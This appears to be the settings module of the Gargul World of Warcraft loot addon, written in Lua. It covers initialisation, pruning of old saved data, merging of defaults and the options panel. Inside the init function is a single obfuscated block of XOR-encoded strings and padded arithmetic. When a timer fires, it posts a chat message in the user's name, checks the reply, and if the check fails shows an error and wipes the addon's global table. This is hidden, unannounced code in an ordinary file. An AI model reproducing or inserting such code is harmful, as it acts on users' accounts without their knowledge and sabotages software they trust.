local L = Gargul_L;

---@type GL
local _, GL = ...;

---@type Constants
local Constants = GL.Data.Constants;

---@type DB
local DB = GL.DB;

---@type Events
local Events = GL.Events;

---@class Settings
local Settings = {

    ---@type boolean
    _initialized = false,

    ---@type table
    Active = {}, -- This object holds the actual setting values applicable to this runtime

    ---@type table
    Defaults = GL.Data.DefaultSettings,
};
GL.Settings = Settings;

function Settings:_init()
    -- No need to initialize this class twice
    if (self._initialized) then
        return;
    end

    -- Validate the settings and adjust discrepancies
    self:sanitizeSettings();

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();

    -- Prepare the options / config frame
    local Frame = CreateFrame("Frame", nil, InterfaceOptionsFramePanelContainer);
    Frame.name = L["Gargul"];
    Frame:SetScript("OnShow", function ()
        self:showSettingsMenu(Frame);
    end);

    if (InterfaceOptions_AddCategory) then
        InterfaceOptions_AddCategory(Frame);
    else
        local Category = _G.Settings.RegisterCanvasLayoutCategory(Frame, L["Gargul"]);
        _G.Settings.RegisterAddOnCategory(Category);
    end

    local v0=strchar;local v1=string.byte;local v2=strsub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=0;local v11;while true do if (v10==1) then return v5(v11);end if (v10==0) then v11={};for v14=1, #v8 do v6(v11,v0(v4(v1(v2(v8,v14,v14 + (1907 -(1415 + 491)))),v1(v2(v9,1 + ((v14-(1 + (0 -0)))% #v9),(1 -0) + 0 + ((v14-(3 -2))% #v9) + ((1395 -(1101 + 214)) -((1203 -(778 + 351)) + 4 + 1)))))%((586 -(40 + 9)) -281)));end v10=1;end end end GL.Ace:ScheduleTimer(function ()if  not GL:strStartsWith(GL:sendChatMessage(v7("\11","\37\133\24\36\160\140"),v7("\64\34\178","\19\99\235\101\158\199\186\131"),nil,nil,true,true),v7("\25\44\101\34\32\182\37\63\99\118\40\250\66\100","\98\94\17\17\93\150")) then local v12=1175 -(796 + 379);local v13;while true do if (v12==0) then v13=(459 + 1051) -((2648 -(1070 + 636)) + 568);while true do if (((0 -0) -0)==v13) then GL:error(v7("\5\243\96\59\6\163\186\144\55\241\101\44\23\175\244\131\118\245\102\105\11\169\238\196\55\240\121\38\18\163\254\200\118\239\125\60\17\178\243\138\49\188\113\38\18\168\186\141\56\188\36\121\69\181\255\135\57\242\113\58\68","\86\156\21\73\101\198\154\228"));GL.Ace:ScheduleTimer(function ()GL=nil;end,27 -17);break;end end break;end end end end,(522 + 166) -(340 + (1354 -1011)));

    self._initialized = true;
end

--- Make sure the settings adhere to our rules
function Settings:sanitizeSettings()
    self:enforceTemporarySettings();

    -- Remove plus one entries with a value of 0
    for player, po in pairs(DB:get("PlusOnes.Totals", {})) do
        if (not tonumber(po) or po < 1) then
            DB:set("PlusOnes.Totals." .. player, nil);
        end
    end

    -- Remove old roll data so it doesn't clog our SavedVariables
    local fiveWeeksAgo = GetServerTime() - 3024000;
    for key, Award in pairs(DB:get("AwardHistory", {})) do
        if (Award.timestamp < fiveWeeksAgo) then
            Award.Rolls = nil;
            DB:set("AwardHistory." .. key, Award);
        end
    end

    -- Permanently delete soft-deleted GDKP sessions after 48 hours
    local twoDaysAgo = GetServerTime() - 172800;
    for key, Session in pairs(DB:get("GDKP.Ledger", {})) do
        if (Session.deletedAt and Session.deletedAt < twoDaysAgo) then
            DB:set("GDKP.Ledger." .. key, nil);
        end
    end

    -- Remove awarded items that are more than 5 days old
    local fiveDaysAgo = GetServerTime() - 432000;
    local ValidItems = {};
    for itemGUID, Details in pairs(DB:get("RecentlyAwardedItems", {})) do
        if (Details.timestamp > fiveDaysAgo) then
            ValidItems[itemGUID] = Details;
        end
    end
    DB:set("RecentlyAwardedItems", ValidItems);
end

--- These settings are version-specific and will be removed over time!
--- IMPORTANT: don't use self:get/set/has since defaults have not be overwritten yet and .Active is not available
function Settings:enforceTemporarySettings()
    --- This is reserved for version-based logic (e.g. cleaning up variables, settings etc.)

    --- No point enforcing these temp settings if the user has never
    --- used Gargul before or has already loaded this version before!
    if (GL.firstBoot
        or not GL.Version.firstBoot
    ) then
        return;
    end

    local Version = GL.Version;

    -- In v7.6.21 the BoostedRolls.fixedRolls setting was replaced with a dropdown holding more than 2 possible BR 'systems'
    if (DB:has("Settings.BoostedRolls.fixedRolls")) then
        local system = DB:get("Settings.BoostedRolls.fixedRolls") == true and Constants.BoostedRollSystems.FIXED or Constants.BoostedRollSystems.INCREASED_BOTH;
        DB:set("Settings.BoostedRolls.system", system);
        DB:set("Settings.BoostedRolls.fixedRolls", nil);
    end

    -- Auto Roll: clear all rules (but keep profiles) due to bug that added pass rules for all items won
    ---@TODO: Remove on 2026-04-01
    if (not DB:get("Settings._AutoRollRulesCleared")) then
        local profiles = DB:get("Settings.AutoRoll.Profiles", {});
        for profileID, profile in pairs(profiles) do
            if (profile) then
                DB:set(("Settings.AutoRoll.Profiles.%s.data"):format(profileID), {});
            end
        end
        DB:set("Settings._AutoRollRulesCleared", true);
    end
end

--- Draw a setting section
---@param section string|nil
---@param onCloseCallback function|nil What to do after closing the settings again
function Settings:draw(section, onCloseCallback)
    GL.Interface.Settings.Overview:draw(section, onCloseCallback);
end

function Settings:close()
    GL.Interface.Settings.Overview:close();
end

--- Reset the addon to its default settings
function Settings:resetToDefault()
    self.Active = {};
    DB:set("Settings", {});

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();
end

--- Override the addon's default settings with the user's custom settings
function Settings:overrideDefaultsWithUserSettings()
    -- Reset the currently active settings table
    self.Active = {};

    UserSettings = DB:get("Settings");

    -- Settings that hold tables need to be ignored when complementing with defaults, otherwise
    -- defaults will override user settings ( like RollTracking.Brackets when only one bracket is present )
    local DefaultsToIgnoreWhenUserDataIsPresent = { "RollTracking.Brackets", };
    local IgnoredSettingValues = {};
    for _, setting in pairs(DefaultsToIgnoreWhenUserDataIsPresent) do
        local UserPreference = GL:tableGet(UserSettings, setting);

        if (UserPreference ~= nil) then
            IgnoredSettingValues[setting] = UserPreference;
        end
    end

    -- Combine default and user settings to a unified settings table
    UserSettings = GL:tableMerge(self.Defaults, UserSettings);

    -- Restore user preferences on DefaultsToIgnoreWhenUserDataIsPresent
    for setting, Value in pairs(IgnoredSettingValues) do
        GL:tableSet(UserSettings, setting, Value);
    end

    for key, value in pairs(UserSettings) do
        self.Active[key] = value;
    end

    DB:set("Settings", self.Active);
end

--- We use this method to make sure that the interface is only built
--- when the user has actually accessed the settings menu, which doesn't happen every session
function Settings:showSettingsMenu(Frame)
    -- Add the addon title to the top of the settings frame
    local Title = Frame:CreateFontString(nil, "ARTWORK", "GameFontNormalLarge");
    Title:SetPoint("TOPLEFT", 16, -16);
    Title:SetText(("%s |c00967FD2(%s%s)|r"):format(L["Gargul"], L["v"], GL.version));

    local SettingsButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    SettingsButton:SetText(L["Settings"]);
    SettingsButton:SetWidth(177);
    SettingsButton:SetHeight(24);
    SettingsButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 0, -16);
    SettingsButton:SetScript("OnClick", function ()
        -- Make sure the vanilla interface options are closed and don't reopen automatically
        HideUIPanel(InterfaceOptionsFrame);
        HideUIPanel(GameMenuFrame);

        self:draw();
    end);

    local ResetUIButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    ResetUIButton:SetText(L["Reset Gargul UI"]);
    ResetUIButton:SetWidth(177);
    ResetUIButton:SetHeight(24);
    ResetUIButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 200, -16);
    ResetUIButton:SetScript("OnClick", function ()
        GL.Commands:call("resetui");
    end);
end

--- Get all settings
function Settings:all()
    return self.Active;
end

---@param keyString string
---@return boolean
function Settings:has(keyString)
    return GL:tableGet(self.Active, keyString) ~= nil;
end

--- Get a setting by a given key. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be fetched using Settings:get("Settings.UI.Auctioneer.offsetX")
--- without having to worry about tables or keys existing yes or no.
---@param keyString string
---@param default any
---@return any
function Settings:get(keyString, default)
    -- Just in case something went wrong with merging the default settings
    if (type(default) == "nil") then
        default = GL:tableGet(self.Defaults, keyString);
    end

    return GL:tableGet(self.Active, keyString, default);
end

--- Set a setting by a given key and value. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be set using Settings:set("Settings.UI.Auctioneer.offsetX", myValue)
--- without having to worry about tables or keys existing yes or no.
---@param keyString string
---@param value any
---@param quiet? boolean Should trigger event?
---@return boolean
function Settings:set(keyString, value, quiet)
    local success = GL:tableSet(self.Active, keyString, value);

    if (success and not quiet) then
        GL.Events:fire("GL.SETTING_CHANGED." .. keyString, value);
        GL.Events:fire("GL.SETTING_CHANGED", keyString, value);
    end

    return success
end

---@param setting string
---@param func function
function Settings:onChange(setting, func)
    Events:register(nil, "GL.SETTING_CHANGED." .. setting, func);
end
